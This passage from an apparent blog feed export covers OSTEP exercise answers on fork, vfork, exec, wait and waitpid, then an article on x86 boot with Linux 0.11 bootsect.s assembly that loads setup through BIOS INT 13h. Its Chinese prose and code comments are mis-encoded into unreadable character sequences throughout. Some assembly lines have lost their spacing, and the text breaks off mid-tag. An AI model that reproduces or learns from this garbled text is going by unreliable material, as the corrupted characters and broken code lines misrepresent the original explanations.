title="1"></a>1</h2><p>çˆ¶å­è¿›ç¨‹çš„å˜é‡çš„å€¼æ˜¯ç‹¬ç«‹çš„ï¼Œä¸€ä¸ªè¿›ç¨‹å¯¹å˜é‡çš„ä¿®æ”¹å¹¶ä¸ä¼šå½±å“å¦ä¸€ä¸ªå˜é‡çš„ç›¸åŒåå­—çš„å€¼</p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>çˆ¶å­è¿›ç¨‹å…·æœ‰ç›¸åŒçš„æ–‡ä»¶åç§»é‡</p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>forkä¹‹åçˆ¶å­è¿›ç¨‹çš„æ‰§è¡Œé¡ºåºæ˜¯ä¸å›ºå®šçš„ï¼Œä½†æ˜¯vforkå¯ä»¥å®ç°é¢˜æ„ç›®çš„ï¼Œvforkä¼šä½¿å­è¿›ç¨‹å…ˆæ‰§è¡Œ</p><blockquote><p>vfork() differs from fork(2) in that the calling thread is suspended until  the  child  terminates<br>       (either  normally,  by  calling  _exit(2), or abnormally, after delivery of a fatal signal), or it<br>       makes a call to execve(2).</p></blockquote><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>å‡½æ•°åŸå‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp">SYNOPSIS<br>       <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br>       <span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;<br><br>       <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execl</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pathname, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *arg, ...</span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-comment">/* (char  *) NULL */</span>)</span></span>;<br>       <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execlp</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *file, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *arg, ...</span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-comment">/* (char  *) NULL */</span>)</span></span>;<br>       <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execle</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pathname, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *arg, ...</span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-comment">/*, (char *) NULL, char *const envp[] */</span>)</span></span>;<br>       <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execv</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pathname, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[])</span></span>;<br>       <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execvp</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *file, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[])</span></span>;<br>       <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execvpe</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *file, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[],</span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> envp[])</span></span>;<br></code></pre></td></tr></table></figure><p>å¼•è‡ª<a href="https://stackoverflow.com/questions/5769734/what-are-the-different-versions-of-exec-used-for-in-c-and-c/5769803#5769803%EF%BC%9A">https://stackoverflow.com/questions/5769734/what-are-the-different-versions-of-exec-used-for-in-c-and-c/5769803#5769803ï¼š</a></p><p>The differences are combinations of:</p><ol><li><strong>L vs V</strong>: whether you want to pass the parameters to the execâ€™ed program as<ul><li>  <strong>L</strong>: individual parameters in the call (variable argument list):Â <code>execl()</code>,Â <code>execle()</code>,Â <code>execlp()</code>, andÂ <code>execlpe()</code></li><li>  <strong>V</strong>: as an array of char*Â <code>execv()</code>,Â <code>execve()</code>,Â <code>execvp()</code>, andÂ <code>execvpe()</code></li></ul> The array format is useful when the number of parameters that are to be sent to the execâ€™ed process are variable â€“ as in not known in advance, so you canâ€™t put in a fixed number of parameters in a function call.</li><li><strong>E</strong>: The versions with an â€˜eâ€™ at the end let you additionally pass an array of char* that are a set of strings added to the spawned processes environment before the execâ€™ed program launches. Yet another way of passing parameters, really.</li><li> <strong>P</strong>: The versions with â€˜pâ€™ in there use the environment variableÂ <code>PATH</code>Â to search for the executable file named to execute. The versions without the â€˜pâ€™ require an absolute or relative file path to be prepended to the filename of the executable if it is not in the current working directory.</li></ol><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><ul><li>çˆ¶è¿›ç¨‹ï¼šè¿”å›å­è¿›ç¨‹çš„è¿›ç¨‹å·</li><li>å­è¿›ç¨‹ï¼šè°ƒç”¨çš„è¿›ç¨‹<code>wait()</code>æ²¡æœ‰è¦ç­‰å¾…çš„å­è¿›ç¨‹ï¼Œé‚£ä¹ˆå®ƒä¼šç«‹å³è¿”å›<code>-1</code>ï¼ŒæŒ‡ç¤ºé”™è¯¯ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ<code>errno</code>å°†è®¾ç½®ä¸º<code>ECHILD</code>ã€‚å¯è§manæ‰‹å†Œçš„return errorå†…å®¹</li></ul><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><ul><li><code>pid_t wait (int * status)</code><ul><li>å­è¿›ç¨‹çš„ç»“æŸçŠ¶æ€å€¼ä¼šç”±å‚æ•°statusè¿”å›ï¼Œå¦‚æœä¸åœ¨æ„ç»“æŸçŠ¶æ€å€¼ï¼Œåˆ™å‚æ•°statuså¯ä»¥è®¾æˆNULL</li></ul></li><li><code>pid_t waitpid(pid_t pid,int * status,int options)</code><ul><li>å‚æ•°pidä¸ºæ¬²ç­‰å¾…çš„å­è¿›ç¨‹è¯†åˆ«ç <ul><li>pid&lt;-1 ç­‰å¾…è¿›ç¨‹ç»„è¯†åˆ«ç ä¸ºpidç»å¯¹å€¼çš„ä»»ä½•å­è¿›ç¨‹ã€‚  </li><li>pid=-1 ç­‰å¾…ä»»ä½•å­è¿›ç¨‹ï¼Œç›¸å½“äºwait()ã€‚  </li><li>pid=0 ç­‰å¾…è¿›ç¨‹ç»„è¯†åˆ«ç ä¸ç›®å‰è¿›ç¨‹ç›¸åŒçš„ä»»ä½•å­è¿›ç¨‹ã€‚  </li><li>pid&gt;0 ç­‰å¾…ä»»ä½•å­è¿›ç¨‹è¯†åˆ«ç ä¸ºpidçš„å­è¿›ç¨‹ã€‚</li></ul></li><li>å­è¿›ç¨‹çš„ç»“æŸçŠ¶æ€è¿”å›åå­˜äºstatus</li></ul></li></ul><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>å­è¿›ç¨‹åœ¨å…³é—­æ ‡å‡†è¾“å‡ºåï¼Œprintfæ— æ³•æ‰“å°åˆ°æ ‡å‡†è¾“å‡º</p>]]></content>
    
    
    <categories>
      
      <category>OSTEP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è®¡ç®—æœºåŠ ç”µåå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿä»£ç  &amp; ç†è®ºåˆ†æ</title>
    <link href="/p/8b271bd/"/>
    <url>/p/8b271bd/</url>
    
    <content type="html"><![CDATA[<p>è®¡ç®—æœºåˆšè¢«åŠ ç”µçš„æ—¶å€™ï¼ŒRAMä¸­ç©ºç©ºå¦‚ä¹Ÿï¼ŒOSå­˜å‚¨åœ¨ç£ç›˜ä¸­ï¼ŒCPUåªèƒ½æ‰§è¡Œè¢«åŠ è½½åˆ°å†…å­˜ä¸­çš„ä»£ç ï¼Œé‚£ä¹ˆæ“ä½œç³»ç»Ÿçš„ä»£ç æ˜¯å¦‚ä½•è¢«CPUæ‰§è¡Œçš„å‘¢ï¼Ÿ</p><h1 id="1-BIOSé˜¶æ®µ"><a href="#1-BIOSé˜¶æ®µ" class="headerlink" title="1.BIOSé˜¶æ®µ"></a>1.BIOSé˜¶æ®µ</h1><p>é¦–å…ˆï¼ŒCPUè¢«è®¾è®¡ä¸ºåŠ ç”µç¬é—´CS:IPæŒ‡å‘0xF000:0xFFF0ï¼Œä¹Ÿå³æ˜¯0xFFFF0çš„ä½ç½®ã€‚æ­¤æ—¶æ˜¯åœ¨å®æ¨¡å¼ä¸‹ï¼Œè¿™ä¸ªåœ°å€å³æ˜¯å®é™…ç‰©ç†åœ°å€ï¼ŒROM BIOSè¢«è®¾è®¡ä¸ºå­˜å‚¨åœ¨è¿™ä¸ªä½ç½®ï¼Œå®ƒçš„ä»£ç å…¥å£åœ°å€å³æ˜¯0xFFFF0ã€‚BIOSçš„ä»£ç åœ°å€èŒƒå›´ï¼š0xFE000~0xFFFFFï¼Œè¿™äº›ä»£ç çš„ä½œç”¨æ˜¯ï¼š</p><ul><li>è¿›è¡Œç¡¬ä»¶è‡ªæ£€ï¼Œæ£€æµ‹CPUã€æ˜¾å¡ã€å†…å­˜ã€ç¡¬ç›˜çš„ä¿¡æ¯</li><li>åœ¨å†…å­˜æœ€å¼€å§‹çš„åŒºåŸŸæ„å»ºä¸­æ–­å‘é‡è¡¨ï¼ˆ0x00000~0x003FFï¼Œ1KBå†…å­˜ç©ºé—´ï¼‰</li><li>æ„å»ºBIOSæ•°æ®åŒºï¼ˆ0x00400~0x004FFï¼‰</li><li>åœ¨ä¸Šè¿°æ•°æ®åŒºåé¢çº¦57KBçš„ä½ç½®åŠ è½½8KBå·¦å³çš„ã€ä¸ä¸­æ–­å‘é‡è¡¨å¯¹åº”çš„ä¸­æ–­å¤„ç†ç¨‹åº</li></ul><h1 id="2-å¼•å¯¼æ‰‡åŒºï¼ˆbootsect-sï¼‰"><a href="#2-å¼•å¯¼æ‰‡åŒºï¼ˆbootsect-sï¼‰" class="headerlink" title="2.å¼•å¯¼æ‰‡åŒºï¼ˆbootsect.sï¼‰"></a>2.å¼•å¯¼æ‰‡åŒºï¼ˆbootsect.sï¼‰</h1><p>bootsectä¹Ÿè¢«ç§°ä¸ºMBRï¼ˆmaster boot recordï¼‰</p><p>CPUæ”¶åˆ°int 0x19ä¸­æ–­ï¼Œåœ¨ä¸­æ–­å‘é‡è¡¨ä¸­æ‰¾åˆ°å¯¹åº”çš„ä¸­æ–­æœåŠ¡ç¨‹åºçš„å…¥å£åœ°å€ï¼Œå¹¶æ‰§è¡Œè¯¥<strong>ä¸­æ–­æœåŠ¡ç¨‹åºå¯¹åº”çš„åŠŸèƒ½</strong>ï¼šå°†ç¬¬ä¸€æ‰‡åŒºï¼ˆ512ä¸ªå­—èŠ‚ï¼‰çš„ç¨‹åºï¼Œä¹Ÿå³æ˜¯bootsectåŠ è½½åˆ°å†…å­˜ä¸­0x07C00åœ°å€å¤„å¹¶è·³è½¬åˆ°æ­¤å¤„</p><p>æ¥ä¸‹æ¥ï¼Œbootsectæœ¬èº«512ä¸ªå­—èŠ‚ä¼šè¢«ä»0x7C00å¤åˆ¶åˆ°å†…å­˜çš„0x90000å¤„</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,<span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> BOOTSEG<span class="hljs-comment">;// å°†dsæ®µå¯„å­˜å™¨ç½®ä¸º7C0h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,<span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> INITSEG<span class="hljs-comment">;// å°†esæ®µå¯„å­˜å™¨ç½®ä¸º9000h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">cx</span>,<span class="hljs-number">256</span><span class="hljs-comment">;// ç§»åŠ¨è®¡æ•°å€¼ ï¼ 256å­— = 512 å­—èŠ‚</span><br><span class="hljs-keyword">sub</span><span class="hljs-built_in">si</span>,<span class="hljs-built_in">si</span><span class="hljs-comment">;// æºåœ°å€   ds:si = 07C0h:0000h</span><br><span class="hljs-keyword">sub</span><span class="hljs-built_in">di</span>,<span class="hljs-built_in">di</span><span class="hljs-comment">;// ç›®çš„åœ°å€ es:di = 9000h:0000h</span><br><span class="hljs-keyword">rep</span> <span class="hljs-keyword">movsw</span><span class="hljs-comment">;// é‡å¤æ‰§è¡Œï¼Œç›´åˆ°cx = 0;ç§»åŠ¨1ä¸ªå­—</span><br></code></pre></td></tr></table></figure><p>ä¹‹åï¼Œbootsectè§¦å‘0x13ä¸­æ–­å°†setup.sç¨‹åºåŠ è½½åˆ°å†…å­˜çš„0x90200å¤„</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk">load_setup:<br>;<span class="hljs-regexp">//</span> ä»¥ä¸‹<span class="hljs-number">10</span>è¡Œçš„ç”¨é€”æ˜¯åˆ©ç”¨BIOSä¸­æ–­INT <span class="hljs-number">13</span>hå°†setupæ¨¡å—ä»ç£ç›˜ç¬¬<span class="hljs-number">2</span>ä¸ªæ‰‡åŒº<br>;<span class="hljs-regexp">//</span> å¼€å§‹è¯»åˆ°<span class="hljs-number">90200</span>hå¼€å§‹å¤„ï¼Œå…±è¯»<span class="hljs-number">4</span>ä¸ªæ‰‡åŒºã€‚å¦‚æœè¯»å‡ºé”™ï¼Œåˆ™å¤ä½é©±åŠ¨å™¨ï¼Œå¹¶<br>;<span class="hljs-regexp">//</span> é‡è¯•ï¼Œæ²¡æœ‰é€€è·¯ã€‚<br>;<span class="hljs-regexp">//</span> INT <span class="hljs-number">13</span>h çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š<br>;<span class="hljs-regexp">//</span> ah = <span class="hljs-number">02</span>h - è¯»ç£ç›˜æ‰‡åŒºåˆ°å†…å­˜ï¼›al = éœ€è¦è¯»å‡ºçš„æ‰‡åŒºæ•°é‡ï¼›<br>;<span class="hljs-regexp">//</span> ch = ç£é“ï¼ˆæŸ±é¢ï¼‰å·çš„ä½<span class="hljs-number">8</span>ä½ï¼›  cl = å¼€å§‹æ‰‡åŒºï¼ˆ<span class="hljs-number">0</span>ï¼<span class="hljs-number">5</span>ä½ï¼‰ï¼Œç£é“å·é«˜<span class="hljs-number">2</span>ä½ï¼ˆ<span class="hljs-number">6</span>ï¼<span class="hljs-number">7</span>ï¼‰ï¼›<br>;<span class="hljs-regexp">//</span> dh = ç£å¤´å·ï¼›  dl = é©±åŠ¨å™¨å·ï¼ˆå¦‚æœæ˜¯ç¡¬ç›˜åˆ™è¦ç½®ä¸º<span class="hljs-number">7</span>ï¼‰ï¼›<br>;<span class="hljs-regexp">//</span> es:bx -&gt;æŒ‡å‘æ•°æ®ç¼“å†²åŒºï¼›  å¦‚æœå‡ºé”™åˆ™CFæ ‡å¿—ç½®ä½ã€‚ <br>movdx,<span class="hljs-number">0000</span>h;<span class="hljs-regexp">//</span> drive <span class="hljs-number">0</span>, head <span class="hljs-number">0</span><br>movcx,<span class="hljs-number">0002</span>h;<span class="hljs-regexp">//</span> sector <span class="hljs-number">2</span>, track <span class="hljs-number">0</span><br>movbx,<span class="hljs-number">0200</span>h;<span class="hljs-regexp">//</span> address = <span class="hljs-number">512</span>, <span class="hljs-keyword">in</span> INITSEG<br>movax,<span class="hljs-number">0200</span>h+SETUPLEN;<span class="hljs-regexp">//</span> service <span class="hljs-number">2</span>, nr of sectors<br>int<span class="hljs-number">13</span>h;<span class="hljs-regexp">//</span> read it<br>jncok_load_setup;<span class="hljs-regexp">//</span> ok - <span class="hljs-keyword">continue</span><br>movdx,<span class="hljs-number">0000</span>h<br>movax,<span class="hljs-number">0000</span>h;<span class="hljs-regexp">//</span> reset the diskette<br>int<span class="hljs-number">13</span>h<br>jmpload_setup<br></code></pre></td></tr></table></figure><p>å†å¾€åï¼Œå†æ¬¡è§¦å‘0x13ä¸­æ–­å°†ç³»ç»Ÿæ¨¡å—è£…è½½å…¥å†…å­˜0x10000åœ°å€å¤„</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">ok_load_setup:</span><br><span class="hljs-comment">;/* å–ç£ç›˜é©±åŠ¨å™¨çš„å‚æ•°ï¼Œç‰¹åˆ«æ˜¯æ¯é“çš„æ‰‡åŒºæ•°é‡ã€‚</span><br><span class="hljs-comment">;   å–ç£ç›˜é©±åŠ¨å™¨å‚æ•°INT 13hè°ƒç”¨æ ¼å¼å’Œè¿”å›ä¿¡æ¯å¦‚ä¸‹ï¼š</span><br><span class="hljs-comment">;   ah = 08hdl = é©±åŠ¨å™¨å·ï¼ˆå¦‚æœæ˜¯ç¡¬ç›˜åˆ™è¦ç½®ä½7ä¸º1ï¼‰ã€‚</span><br><span class="hljs-comment">;   è¿”å›ä¿¡æ¯ï¼š</span><br><span class="hljs-comment">;   å¦‚æœå‡ºé”™åˆ™CFç½®ä½ï¼Œå¹¶ä¸”ah = çŠ¶æ€ç ã€‚</span><br><span class="hljs-comment">;   ah = 0, al = 0,         bl = é©±åŠ¨å™¨ç±»å‹ï¼ˆAT/PS2ï¼‰</span><br><span class="hljs-comment">;   ch = æœ€å¤§ç£é“å·çš„ä½8ä½ï¼Œcl = æ¯ç£é“æœ€å¤§æ‰‡åŒºæ•°ï¼ˆä½0-5ï¼‰ï¼Œæœ€å¤§ç£é“å·é«˜2ä½ï¼ˆä½6-7ï¼‰</span><br><span class="hljs-comment">;   dh = æœ€å¤§ç£å¤´æ•°ï¼Œ       ç”µåŠ›ï¼ é©±åŠ¨å™¨æ•°é‡ï¼Œ</span><br><span class="hljs-comment">;   es:di -&gt; è½¯é©±ç£ç›˜å‚æ•°è¡¨ã€‚ */</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">dl</span>,<span class="hljs-number">00h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,<span class="hljs-number">0800h</span><span class="hljs-comment">;// AH=8 is get drive parameters</span><br><span class="hljs-keyword">int</span><span class="hljs-number">13h</span><br><span class="hljs-keyword">mov</span><span class="hljs-number">ch</span>,<span class="hljs-number">00h</span><br><span class="hljs-comment">;//seg cs;// è¡¨ç¤ºä¸‹ä¸€æ¡è¯­å¥çš„æ“ä½œæ•°åœ¨csæ®µå¯„å­˜å™¨æ‰€æŒ‡çš„æ®µä¸­ã€‚</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">cs</span>:sectors,<span class="hljs-built_in">cx</span><span class="hljs-comment">;// ä¿å­˜æ¯ç£é“æ‰‡åŒºæ•°ã€‚</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,INITSEG<br><span class="hljs-keyword">mov</span><span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><span class="hljs-comment">;// å› ä¸ºä¸Šé¢å–ç£ç›˜å‚æ•°ä¸­æ–­æ”¹æ‰äº†esçš„å€¼ï¼Œè¿™é‡Œé‡æ–°æ”¹å›ã€‚</span><br></code></pre></td></tr></table></figure><p>ç”±äºè¿™éƒ¨åˆ†ä»£ç æ¯”è¾ƒé•¿ï¼Œå› æ­¤æ—¶é—´ä¹Ÿæ¯”è¾ƒä¹…ï¼Œå±å¹•ä¸Šä¼šæ‰“å°å‡ºâ€œloading systemâ€è¿›è¡Œæé†’</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-comment">;// Print some inane message   åœ¨æ˜¾ç¤ºä¸€äº›ä¿¡æ¯ï¼ˆ&#x27;Loading system ... &#x27;å›è½¦æ¢è¡Œï¼Œå…±24ä¸ªå­—ç¬¦ï¼‰ã€‚</span><br><br><span class="hljs-keyword">mov</span><span class="hljs-number">ah</span>,<span class="hljs-number">03h</span><span class="hljs-comment">;// read cursor pos</span><br><span class="hljs-keyword">xor</span><span class="hljs-number">bh</span>,<span class="hljs-number">bh</span><span class="hljs-comment">;// è¯»å…‰æ ‡ä½ç½®ã€‚</span><br><span class="hljs-keyword">int</span><span class="hljs-number">10h</span><br><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">cx</span>,<span class="hljs-number">27</span><span class="hljs-comment">;// å…±24ä¸ªå­—ç¬¦ã€‚</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">bx</span>,<span class="hljs-number">0007h</span><span class="hljs-comment">;// page 0, attribute 7 (normal)</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">bp</span>,offset msg1<span class="hljs-comment">;// æŒ‡å‘è¦æ˜¾ç¤ºçš„å­—ç¬¦ä¸²ã€‚</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,<span class="hljs-number">1301h</span><span class="hljs-comment">;// write string, move cursor</span><br><span class="hljs-keyword">int</span><span class="hljs-number">10h</span><span class="hljs-comment">;// å†™å­—ç¬¦ä¸²å¹¶ç§»åŠ¨å…‰æ ‡ã€‚</span><br></code></pre></td></tr></table></figure><p>æœ€åï¼Œç¡®è®¤æ ¹æ–‡ä»¶ç³»ç»Ÿçš„è®¾å¤‡å·ï¼Œå¹¶è·³è½¬åˆ°setupå‡½æ•°çš„0x90200åœ°å€å¤„</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs awk">;<span class="hljs-regexp">//</span> æ­¤åï¼Œæˆ‘ä»¬æ£€æŸ¥è¦ä½¿ç”¨å“ªä¸ªæ ¹æ–‡ä»¶ç³»ç»Ÿè®¾å¤‡ï¼ˆç®€ç§°æ ¹è®¾å¤‡ï¼‰ã€‚å¦‚æœå·²ç»æŒ‡å®šäº†è®¾å¤‡ï¼ˆ!=<span class="hljs-number">0</span>ï¼‰<br>;<span class="hljs-regexp">//</span> å°±ç›´æ¥ä½¿ç”¨ç»™å®šçš„è®¾å¤‡ã€‚å¦åˆ™å°±éœ€è¦æ ¹æ®BIOSæŠ¥å‘Šçš„æ¯ç£é“æ‰‡åŒºæ•°æ¥<br>;<span class="hljs-regexp">//</span> ç¡®å®šåˆ°åº•ä½¿ç”¨<span class="hljs-regexp">/dev/</span>PS0(<span class="hljs-number">2</span>,<span class="hljs-number">28</span>)è¿˜æ˜¯<span class="hljs-regexp">/dev/</span>at0(<span class="hljs-number">2</span>,<span class="hljs-number">8</span>)ã€‚<br>;<span class="hljs-regexp">//</span>ä¸Šé¢ä¸€è¡Œä¸­ä¸¤ä¸ªè®¾å¤‡æ–‡ä»¶çš„å«ä¹‰ï¼š<br>;<span class="hljs-regexp">//</span>åœ¨Linuxä¸­è½¯é©±çš„ä¸»è®¾å¤‡å·æ˜¯<span class="hljs-number">2</span>ï¼ˆå‚åŠ ç¬¬<span class="hljs-number">43</span>è¡Œæ³¨é‡Šï¼‰ï¼Œæ¬¡è®¾å¤‡å· = type*<span class="hljs-number">4</span> + nr, å…¶ä¸­<br>;<span class="hljs-regexp">//</span>nrä¸º<span class="hljs-number">0</span>ï¼<span class="hljs-number">3</span>åˆ†åˆ«å¯¹åº”è½¯é©±Aã€Bã€Cæˆ–Dï¼›typeæ˜¯è½¯é©±çš„ç±»å‹ï¼ˆ<span class="hljs-number">2</span>-&gt;<span class="hljs-number">1.2</span>Mæˆ–<span class="hljs-number">7</span>-&gt;<span class="hljs-number">1.44</span>Mç­‰ï¼‰ã€‚<br>;<span class="hljs-regexp">//</span>å› ä¸º<span class="hljs-number">7</span>*<span class="hljs-number">4</span> + <span class="hljs-number">0</span> = <span class="hljs-number">28</span>ï¼Œæ‰€ä»¥<span class="hljs-regexp">/dev/</span>PS0(<span class="hljs-number">2</span>,<span class="hljs-number">28</span>)æŒ‡çš„æ˜¯<span class="hljs-number">1.44</span>M Aé©±åŠ¨å™¨ï¼Œå…¶è®¾å¤‡å·æ˜¯<span class="hljs-number">021</span>c<br>;<span class="hljs-regexp">//</span>åŒç† <span class="hljs-regexp">/dev/</span>at0(<span class="hljs-number">2</span>,<span class="hljs-number">8</span>)æŒ‡çš„æ˜¯<span class="hljs-number">1.2</span>M Aé©±åŠ¨å™¨ï¼Œå…¶è®¾å¤‡å·æ˜¯<span class="hljs-number">0208</span>ã€‚<br><br>;<span class="hljs-regexp">//</span>seg cs<br>movax,cs:root_dev<br>cmpax,<span class="hljs-number">0</span><br>jneroot_defined;<span class="hljs-regexp">//</span> å¦‚æœ ax != <span class="hljs-number">0</span>, è½¬åˆ°root_defined<br>;<span class="hljs-regexp">//</span>seg cs<br>movbx,cs:sectors;<span class="hljs-regexp">//</span> å–ä¸Šé¢ä¿å­˜çš„æ¯ç£é“æ‰‡åŒºæ•°ã€‚å¦‚æœsectors=<span class="hljs-number">15</span><br>;<span class="hljs-regexp">//</span> åˆ™è¯´æ˜æ˜¯<span class="hljs-number">1.2</span>Mbçš„é©±åŠ¨å™¨ï¼›å¦‚æœsectors=<span class="hljs-number">18</span>ï¼Œåˆ™è¯´æ˜æ˜¯<br>;<span class="hljs-regexp">//</span> <span class="hljs-number">1.44</span>Mbè½¯é©±ã€‚å› ä¸ºæ˜¯å¯å¼•å¯¼çš„é©±åŠ¨å™¨ï¼Œæ‰€ä»¥è‚¯å®šæ˜¯Aé©±ã€‚<br>movax,<span class="hljs-number">0208</span>h;<span class="hljs-regexp">//</span> <span class="hljs-regexp">/dev/</span>ps0 - <span class="hljs-number">1.2</span>Mb<br>cmpbx,<span class="hljs-number">15</span>;<span class="hljs-regexp">//</span> åˆ¤æ–­æ¯ç£é“æ‰‡åŒºæ•°æ˜¯å¦=<span class="hljs-number">15</span><br>jeroot_defined;<span class="hljs-regexp">//</span> å¦‚æœç­‰äºï¼Œåˆ™axä¸­å°±æ˜¯å¼•å¯¼é©±åŠ¨å™¨çš„è®¾å¤‡å·ã€‚<br>movax,<span class="hljs-number">021</span>ch;<span class="hljs-regexp">//</span> <span class="hljs-regexp">/dev/</span>PS0 - <span class="hljs-number">1.44</span>Mb<br>cmpbx,<span class="hljs-number">18</span><br>jeroot_defined<br>undef_root:;<span class="hljs-regexp">//</span> å¦‚æœéƒ½ä¸ä¸€æ ·ï¼Œåˆ™æ­»å¾ªç¯ï¼ˆæ­»æœºï¼‰ã€‚<br>jmp undef_root<br>root_defined:<br>;<span class="hljs-regexp">//</span>seg cs<br>movcs:root_dev,ax;<span class="hljs-regexp">//</span> å°†æ£€æŸ¥è¿‡çš„è®¾å¤‡å·ä¿å­˜èµ·æ¥ã€‚<br><br>;<span class="hljs-regexp">//</span> åˆ°æ­¤ï¼Œæ‰€æœ‰ç¨‹åºéƒ½åŠ è½½å®Œæ¯•ï¼Œæˆ‘ä»¬å°±è·³è½¬åˆ°è¢«<br>;<span class="hljs-regexp">//</span> åŠ è½½åœ¨bootsectåé¢çš„setupç¨‹åºå»ã€‚<br><br>;jmpSETUPSEG:[<span class="hljs-number">0</span>];<span 